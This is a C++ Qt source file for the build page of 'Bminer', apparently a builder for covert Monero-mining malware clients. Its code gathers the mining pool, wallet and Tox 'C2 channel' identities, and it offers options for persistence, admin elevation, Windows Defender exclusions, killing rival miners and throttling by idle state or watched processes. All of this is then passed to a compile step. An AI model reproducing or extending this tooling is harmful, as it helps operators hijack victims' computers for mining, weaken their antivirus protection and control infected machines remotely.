#include "pages/buildpage.h"
#include "ui_buildpage.h"

#include "buildsystem.h"
#include "appsettings.h"
#include "buildinfo.h"
#include "theme.h"
#include "pages/settingspage.h"

#include <QApplication>
#include <QClipboard>
#include <QComboBox>
#include <QCoreApplication>
#include <QDateTime>
#include <QDesktopServices>
#include <QDialog>
#include <QDir>
#include <QFile>
#include <QLabel>
#include <QListWidget>
#include <QMessageBox>
#include <QPushButton>
#include <QThread>
#include <QTimer>
#include <QVBoxLayout>

BuildPage::BuildPage(QWidget *parent)
    : QWidget(parent)
    , ui(new Ui::BuildPage)
    , m_buildSystem(new BuildSystem(this))
{
    ui->setupUi(this);
    applyTheme();
    connectWidgets();

    // Config update channel — a build-time decision. Tox (the serverless C2
    // channel) is the primary/first option, then panel endpoint, then config link.
    ui->modeCombo->addItem(tr("Tox (push over the C2 channel)"), QStringLiteral("tox"));
    ui->modeCombo->addItem(tr("Endpoint (client POSTs to the panel)"), QStringLiteral("endpoint"));
    ui->modeCombo->addItem(tr("Config link (client GETs a URL)"), QStringLiteral("config_link"));
    {
        const QString mode = AppSettings::i()->getString(Keys::ConfigUpdateMode);
        const int idx = ui->modeCombo->findData(mode);
        ui->modeCombo->setCurrentIndex(idx < 0 ? 0 : idx);
    }

    // Keep modeCombo in sync when Settings Reset or external change modifies ConfigUpdateMode
    connect(AppSettings::i(), &AppSettings::changed, this, [this](const QString &k, const QVariant &){
        if (k == Keys::ConfigUpdateMode) {
            const QString mode = AppSettings::i()->getString(Keys::ConfigUpdateMode);
            const int idx = ui->modeCombo->findData(mode.isEmpty() ? QStringLiteral("tox") : mode);
            ui->modeCombo->setCurrentIndex(idx < 0 ? 0 : idx);
        }
    });
    appendLog(tr("Ready."), Info);
    setStatus(tr("Ready"), Info);

    // Connect build system signals. build() runs on a worker thread and emits
    // these from there, so the connections are queued to keep every ui->…
    // access on the GUI thread.
    connect(m_buildSystem, &BuildSystem::outputReceived, this, [this](const QString &text) {
        appendLog(text, Info);
    }, Qt::QueuedConnection);
    connect(m_buildSystem, &BuildSystem::buildComplete, this, [this](bool success) {
        if (success) {
            appendLog(tr("Build completed successfully!"), Success);
            setStatus(tr("Build successful"), Success);
        } else {
            appendLog(tr("Build failed!"), Failure);
            setStatus(tr("Build failed"), Failure);
        }
        setBuilding(false);
    }, Qt::QueuedConnection);
    connect(m_buildSystem, &BuildSystem::progressUpdated, this, [this](int percent, const QString &message) {
        setStatus(QString("%1% - %2").arg(percent).arg(message), Info);
    }, Qt::QueuedConnection);

    // Check dependencies on startup
    QTimer::singleShot(250, this, [this] { checkDependencies(true); });
}

BuildPage::~BuildPage()
{
    delete ui;
}

void BuildPage::applyTheme()
{
    ui->logList->setFont(Theme::monoFont(8));
}

void BuildPage::connectWidgets()
{
    connect(ui->buildButton,      &QPushButton::clicked, this, &BuildPage::onBuildClicked);
    connect(ui->clearLogButton,   &QPushButton::clicked, this, &BuildPage::clearLog);
    connect(ui->openFolderButton, &QPushButton::clicked, this, &BuildPage::openBuildFolder);
    connect(ui->checkDepsButton,  &QPushButton::clicked, this, [this] { checkDependencies(false); });
    connect(ui->infoButton,       &QPushButton::clicked, this, &BuildPage::showInfo);

    // Channel choice persists to settings and is picked up by onBuildClicked().
    connect(ui->modeCombo, QOverload<int>::of(&QComboBox::currentIndexChanged), this, [this](int) {
        AppSettings::i()->set(Keys::ConfigUpdateMode,
                              ui->modeCombo->currentData().toString());
    });
}

void BuildPage::onBuildClicked()
{
    // If Settings has unsaved edits, warn — Build reads AppSettings, not the UI
    if (auto *mw = window()) {
        if (auto *sp = mw->findChild<SettingsPage*>()) {
            if (sp->isDirty()) {
                auto ans = QMessageBox::warning(this, tr("Unsaved Settings"),
                    tr("Settings has unsaved changes that will NOT be included in this build.\n\nSave Settings first?"),
                    QMessageBox::Save | QMessageBox::Ignore | QMessageBox::Cancel, QMessageBox::Save);
                if (ans == QMessageBox::Cancel) return;
                if (ans == QMessageBox::Save) { sp->save(); }
            }
        }
    }
    AppSettings *s = AppSettings::i();
    const QString endpointUrl = s->getString(Keys::NetEndpoint);
    QString modeEarly = s->getString(Keys::ConfigUpdateMode);
    if (modeEarly.isEmpty())
        modeEarly = QStringLiteral("tox");
    else if (modeEarly != QStringLiteral("tox") && modeEarly != QStringLiteral("endpoint")
             && modeEarly != QStringLiteral("config_link")) {
        setStatus(tr("Unknown config update mode — reset to Tox"), Failure);
        appendLog(tr("Config update mode \"%1\" is not valid (stale settings?). Reset it to Tox and retry.").arg(modeEarly), Failure);
        return;
    }
    if (endpointUrl.isEmpty() && modeEarly == QStringLiteral("endpoint")) {
        setStatus(tr("Configure endpoint first"), Failure);
        appendLog(tr("Please go to Settings and configure the Endpoint URL first (or switch Config Update Mode to Tox / Config Link)."), Failure);
        return;
    }

    // Build configuration from settings
    BuildSystem::BuildConfig config;
    config.panelUrl = endpointUrl;
    config.configUrl = s->getString(Keys::BuildConfigUrl).trimmed();
    config.persistence = s->getBool(Keys::BuildPersistence);
    config.debugConsole = s->getBool(Keys::BuildDebugConsole);
    // Foreign Miner Killer and Defender Exclusion require the Admin Manifest:
    // killing other processes / adding exclusions only works when the built
    // client runs elevated, which is what the manifest requests at launch.
    config.adminManifest = s->getBool(Keys::BuildAdminManifest);
    config.defenderExclusion = config.adminManifest && s->getBool(Keys::BuildDefenderExclusion);
    config.foreignMinerKiller = config.adminManifest && s->getBool(Keys::BuildForeignMinerKiller);
    config.cpuMiner = s->getBool(Keys::BuildCpuEnabled);
    config.gpuMiner = false; // GPU mining removed
    config.embedConfig = true;
    config.embeddedConfigPath = QDir(BuildSystem::projectRoot()).filePath("Client/resources/embedded_config.json");
    config.minerPool = s->getString(Keys::MinerPool).trimmed();
    config.minerWallet = s->getString(Keys::MinerWallet).trimmed();
    config.minerPassword = s->getString(Keys::MinerPassword).trimmed();
    config.useTls = s->getBool(Keys::MinerTls);
    config.mineOnIdle = s->getBool(Keys::MinerOnIdle);
    config.mineOnActive = s->getBool(Keys::MinerOnActive);
    config.idleAfterMin = s->getInt(Keys::MinerIdleAfter);
    config.idleEffortPct   = s->getInt(Keys::MinerIdleEffort);
    config.activeEffortPct = s->getInt(Keys::MinerActiveEffort);
    config.watchedProcesses = s->getString(Keys::BuildWatchedProcesses);
    config.idTox = s->operatorToxId();
    config.toxOperatorId = s->getString(Keys::ToxOperatorId);
    config.toxOperatorSavedata = s->getString(Keys::ToxOperatorSavedata);
    config.toxBotId = s->getString(Keys::ToxBotId);
    config.toxBotSavedata = s->getString(Keys::ToxBotSavedata);
    config.toxBotName = s->getString(Keys::ToxBotName);
    config.configUpdateMode = s->getString(Keys::ConfigUpdateMode);

    if (config.configUpdateMode.isEmpty())
        config.configUpdateMode = QStringLiteral("tox");

    // Config link mode is pull-based: the client GETs a URL, so it needs one.
    if (config.configUpdateMode == QStringLiteral("config_link") && config.configUrl.isEmpty()) {
        setStatus(tr("Configure the config URL first"), Failure);
        appendLog(tr("Config link mode needs a Direct config URL — set it in Settings."), Failure);
        return;
    }

    // Pool must be in host:port format so XMRig can parse it.
    if (config.minerPool.isEmpty() || !config.minerPool.contains(QLatin1Char(':'))) {
        setStatus(tr("Invalid pool address"), Failure);
        appendLog(tr("Pool address must be in host:port format (e.g. pool.minexmr.com:4444). Fix it in Settings."), Failure);
        return;
    }
    // A miner without a wallet is useless: the client builds an empty command
    // line and silently never mines, so block it here like the pool.
    if (config.minerWallet.isEmpty()) {
        setStatus(tr("Invalid wallet address"), Failure);
        appendLog(tr("Set a Monero (XMR) wallet address in Settings before building."), Failure);
        return;
    }
    {
        const int colonIdx = config.minerPool.lastIndexOf(QLatin1Char(':'));
        const QString portStr = config.minerPool.mid(colonIdx + 1);
        bool portOk = false;
        const int port = portStr.toInt(&portOk);
        if (!portOk || port < 1 || port > 65535) {
            setStatus(tr("Invalid pool port"), Failure);
            appendLog(tr("Pool port '%1' is not a valid port number (1-65535).").arg(portStr), Failure);
            return;
        }
    }

    // Tox config mode needs an operator identity: either a generated pair or a
    // manually pasted Tox ID.
    const bool haveToxPair = !config.toxOperatorId.trimmed().isEmpty()
                             && !config.toxBotSavedata.trimmed().isEmpty();
    if (config.configUpdateMode == QStringLiteral("tox")
        && !haveToxPair && config.idTox.trimmed().isEmpty()) {
        setStatus(tr("Generate a Tox pair first"), Failure);
        appendLog(tr("Tox config mode needs an operator identity — open the Control page and generate a Tox pair (or paste a Tox ID in Settings)."), Failure);
        return;
    }

    clearLog();
    setBuilding(true);

    // Log all settings being used
    appendLog(tr("=== Build Configuration (from Settings) ==="), Info);
    appendLog(tr("Endpoint URL: %1").arg(endpointUrl), Info);
    appendLog(tr("Config URL:   %1").arg(config.configUrl.isEmpty() ? tr("(none - panel only)") : config.configUrl), Info);
    appendLog(QStringLiteral("CPU Miner:   %1").arg(config.cpuMiner ? tr("enabled") : tr("disabled")), Info);
    appendLog(tr("Pool: %1").arg(config.minerPool.isEmpty() ? tr("(not set)") : config.minerPool), Info);
    appendLog(tr("Wallet: %1").arg(config.minerWallet.isEmpty()
                                      ? tr("(not set)")
                                      : (config.minerWallet.size() > 30
                                             ? config.minerWallet.left(12) + QString::fromUtf8("…") + config.minerWallet.right(10)
                                             : config.minerWallet)), Info);
    appendLog(QStringLiteral("TLS: %1 · Idle: %2 · Active: %3 · Idle after: %4 min")
                  .arg(config.useTls ? tr("on") : tr("off"),
                       config.mineOnIdle ? tr("on") : tr("off"),
                       config.mineOnActive ? tr("on") : tr("off"))
                  .arg(config.idleAfterMin), Info);
    appendLog(tr(""), Info);
    appendLog(tr("--- Build Features ---"), Info);
    appendLog(tr("  Admin Manifest:    %1").arg(config.adminManifest ? tr("enabled") : tr("disabled")), Info);
    appendLog(tr("  Foreign Miner Killer: %1").arg(config.foreignMinerKiller ? tr("enabled") : tr("disabled")), Info);
    appendLog(tr("  Defender Exclusion: %1").arg(config.defenderExclusion ? tr("enabled") : tr("disabled")), Info);
    appendLog(tr("  Debug Console:     %1").arg(config.debugConsole ? tr("enabled") : tr("disabled")), Info);
    appendLog(tr("  Persistence:       %1").arg(config.persistence ? tr("enabled") : tr("disabled")), Info);
    appendLog(tr("  Config update:     %1").arg(config.configUpdateMode), Info);
    if (haveToxPair)
        appendLog(tr("  Tox pair:          operator %1 / bot %2")
                      .arg(config.toxOperatorId.left(12), config.toxBotId.left(12)), Info);
    appendLog(tr(""), Info);
    appendLog(tr("Starting build..."), Info);

    // Run build in background thread
    QThread *thread = QThread::create([this, config] {
        m_buildSystem->build(config, [this](const QString &text) {
            emit m_buildSystem->outputReceived(text);
        });
    });
    if (!thread) {
        setBuilding(false);
        setStatus(tr("Build failed to start"), Failure);
        appendLog(tr("Failed to create build thread. Try restarting the application."), Failure);
        return;
    }
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);
    // Safety net: if the thread exits without the build system emitting buildFinished
    // (e.g. unhandled exception), make sure the UI is never stuck in "Building…".
    connect(thread, &QThread::finished, this, [this] {
        // If the button is still disabled the build system never emitted buildFinished
        // (e.g. unhandled exception in the thread). Unstick the UI.
        if (!ui->buildButton->isEnabled())
            setBuilding(false);
    }, Qt::QueuedConnection);
    thread->start();
}

void BuildPage::openBuildFolder()
{
    // projectRoot() already ends in .../build/release, so the build output
    // lives at <root>/Client/build.
    const QString folder = QDir(BuildSystem::projectRoot()).filePath("Client/build");
    if (!QDir(folder).exists()) {
        setStatus(tr("No build output yet"), Warning);
        appendLog(tr("Build folder not found at %1 — build the client first.").arg(folder), Warning);
        return;
    }
    QDesktopServices::openUrl(QUrl::fromLocalFile(folder));
}

void BuildPage::checkDependencies(bool automatic)
{
    auto deps = m_buildSystem->checkDependencies();

    QStringList missing;
    if (!deps.chocolatey) missing << tr("Chocolatey");
    if (!deps.cmake)       missing << tr("CMake");
    if (!deps.mingw)       missing << tr("MinGW-w64 (g++)");

    if (missing.isEmpty()) {
        if (automatic)
            return;
        appendLog(tr("Build dependencies OK (Chocolatey, CMake, MinGW)."), Success);
        return;
    }

    appendLog(tr("Missing build dependencies: %1").arg(missing.join(QStringLiteral(", "))), Warning);

    if (automatic) {
        // Auto-install in background
        appendLog(tr("Installing missing dependencies..."), Info);
        setStatus(tr("Installing dependencies..."), Warning);

        QThread *thread = QThread::create([this] {
            m_buildSystem->installDependencies([this](const QString &text) {
                emit m_buildSystem->outputReceived(text);
            });
            QMetaObject::invokeMethod(this, [this] {
                appendLog(tr("Dependency installation complete. Please restart the builder."), Success);
                setStatus(tr("Dependencies installed. Restart required."), Success);
            }, Qt::QueuedConnection);
        });
        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
        thread->start();
        return;
    }

    const QString msg = tr("Missing build requirements:\n%1\n\nInstall them now?\n"
                           "(Requires Administrator privileges)")
                            .arg(missing.join(QLatin1Char('\n')));
    const QMessageBox::StandardButton reply = QMessageBox::question(
        this, tr("Missing Dependencies"), msg, QMessageBox::Yes | QMessageBox::No);

    if (reply == QMessageBox::Yes) {
        setStatus(tr("Installing dependencies..."), Warning);
        QThread *thread = QThread::create([this] {
            m_buildSystem->installDependencies([this](const QString &text) {
                emit m_buildSystem->outputReceived(text);
            });
            QMetaObject::invokeMethod(this, [this] {
                appendLog(tr("Dependency installation complete. Please restart the builder."), Success);
                setStatus(tr("Dependencies installed. Restart required."), Success);
            }, Qt::QueuedConnection);
        });
        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
        thread->start();
    }
}

void BuildPage::appendLog(const QString &line, Level level)
{
    QListWidgetItem *item = new QListWidgetItem(
        QStringLiteral("%1  %2")
            .arg(QDateTime::currentDateTime().toString(QStringLiteral("HH:mm:ss")), line));

    switch (level) {
    case Success: item->setForeground(Theme::Teal);    break;
    case Warning: item->setForeground(Theme::Amber);   break;
    case Failure: item->setForeground(Theme::Red);     break;
    default:      item->setForeground(Theme::TextDim); break;
    }

    ui->logList->addItem(item);
    ui->logList->scrollToBottom();

    while (ui->logList->count() > 2000)
        delete ui->logList->takeItem(0);
}

void BuildPage::clearLog()
{
    ui->logList->clear();
}

void BuildPage::setBuilding(bool building)
{
    ui->buildButton->setEnabled(!building);
    ui->buildButton->setText(building ? tr("Building…") : tr("Build client"));
    if (building)
        setStatus(tr("Building…"), Warning);
}

void BuildPage::setStatus(const QString &text, Level level)
{
    switch (level) {
    case Success: Theme::applyText(ui->statusLabel, Theme::TextRole::Ok);    break;
    case Warning: Theme::applyText(ui->statusLabel, Theme::TextRole::Warn);  break;
    case Failure: Theme::applyText(ui->statusLabel, Theme::TextRole::Error); break;
    default:      Theme::applyText(ui->statusLabel, Theme::TextRole::Dim);   break;
    }
    ui->statusLabel->setText(text);
}

void BuildPage::showInfo()
{
    const QString info = QStringLiteral("Bminer %1 (%2)\nQt %3 · %4\n%5")
                             .arg(BuildInfo::version(), BuildInfo::codename(),
                                  BuildInfo::qtRuntimeVersion(), BuildInfo::arch(),
                                  AppSettings::i()->storageLocation());

    QDialog dlg(this);
    dlg.setModal(true);
    dlg.setWindowTitle(tr("Bminer"));
    dlg.setMinimumWidth(400);

    QLabel *label = new QLabel(info, &dlg);
    Theme::applyText(label, Theme::TextRole::Body);

    QPushButton *copyButton = new QPushButton(tr("Copy"), &dlg);
    copyButton->setProperty("ghost", true);
    connect(copyButton, &QPushButton::clicked, this, [info] {
        QApplication::clipboard()->setText(info);
    });

    QPushButton *closeButton = new QPushButton(tr("Close"), &dlg);
    closeButton->setProperty("primary", true);
    connect(closeButton, &QPushButton::clicked, &dlg, &QDialog::accept);

    QHBoxLayout *buttons = new QHBoxLayout;
    buttons->addStretch(1);
    buttons->addWidget(copyButton);
    buttons->addWidget(closeButton);

    QVBoxLayout *layout = new QVBoxLayout(&dlg);
    layout->addWidget(label);
    layout->addLayout(buttons);
    dlg.exec();
}
